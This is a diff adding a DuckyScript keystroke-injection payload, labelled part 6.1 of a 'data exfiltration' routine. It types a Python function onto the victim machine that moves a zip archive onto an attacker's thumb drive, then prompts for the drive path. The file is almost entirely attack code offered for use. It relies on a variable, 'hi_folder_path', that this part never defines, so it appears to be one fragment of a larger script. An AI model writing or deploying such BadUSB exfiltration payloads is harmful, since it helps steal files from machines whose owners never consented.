@@ -1,0 +1,81 @@
+REM #######################################################
+REM #                                                     #
+REM #         PART 6.1 DATA EXFULTRATION MAPPING          #
+REM #                                                     #
+REM #######################################################
+
+
+DELAY 1000 
+ENTER 
+DELAY 500
+ENTER 
+DELAY 400
+ENTER 
+
+DELAY 400 
+STRING import shutil
+DELAY 400
+ENTER 
+DELAY 140 
+STRING import os
+DELAY 400
+ENTER
+DELAY 200
+ENTER
+DELAY 200
+
+STRING def move_zip_to_thumb_drive(zip_file_name, thumb_drive_path):
+DELAY 190
+SHIFT ENTER
+DELAY 180
+STRING     thumb_drive_path = os.path.normpath(thumb_drive_path)  # Normalize the path
+DELAY 230
+ENTER 
+DELAY 140 
+STRING     if not os.path.exists(thumb_drive_path):
+DELAY 170 
+ENTER 
+DELAY 140 
+STRING         print(f"The specified thumb drive path does not exist: {thumb_drive_path}")
+DELAY 230
+ENTER 
+DELAY 140 
+STRING         return
+DELAY 170
+ENTER 
+DELAY 140 
+STRING     zip_file_path = os.path.join(os.path.dirname(hi_folder_path), zip_file_name)
+DELAY 210
+ENTER 
+DELAY 140
+STRING     if os.path.exists(zip_file_path):
+DELAY 150
+ENTER 
+DELAY 140 
+STRING         destination_path = os.path.join(thumb_drive_path, zip_file_name)
+DELAY 220 
+ENTER 
+DELAY 140 
+STRING         shutil.move(zip_file_path, destination_path)
+DELAY 190
+ENTER
+DELAY 140 
+STRING         print(f"Moved zip file to: {destination_path}")
+DELAY 160
+ENTER 
+DELAY 140 
+STRING     else:
+DELAY 150 
+ENTER 
+STRING         print(f"Zip file does not exist: {zip_file_path}")
+DELAY 180 
+ENTER 
+DELAY 140 
+ENTER 
+DELAY 140 
+
+REM PART 2 OF 6.1
+
+STRING thumb_drive_path = input("Enter the path to the thumb drive: ")
+DELAY 300
+ENTER 
